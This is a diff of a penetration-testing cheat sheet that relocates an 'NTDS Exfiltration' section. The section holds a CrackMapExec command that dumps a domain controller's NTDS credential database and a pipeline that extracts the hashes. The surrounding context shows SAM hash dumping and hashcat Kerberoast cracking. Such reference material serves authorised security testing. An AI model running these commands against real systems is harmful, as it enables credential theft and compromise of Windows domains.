@@ -75,20 +75,6 @@ CrackMapExec : Dump local SAM hashes using local admin account
 crackmapexec smb IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
 ```
 
-### NTDS Exfiltration
-
-Dump NTDS :
-
-```markdown
-crackmapexec smb IP -u "USERNAME" -p "PASSWORD" -d "DOMAIN" --ntds
-```
-
-Extract hashes from NTDS :
-
-```markdown
-cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
-```
-
 ### PowerShell one-liners
 
 Bloodhound : Using ingestors to collect the data and then send it to BloodHound.
@@ -138,6 +124,19 @@ Crack hashes :
 hashcat -m 13100 hashes.kerberoast wordlist -O
 ```
 
+### NTDS Exfiltration
+
+Dump NTDS :
+
+```markdown
+crackmapexec smb IP -u "USERNAME" -p "PASSWORD" -d "DOMAIN" --ntds
+```
+
+Extract hashes from NTDS :
+
+```markdown
+cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
+```
 
 ## Pentest Web
 
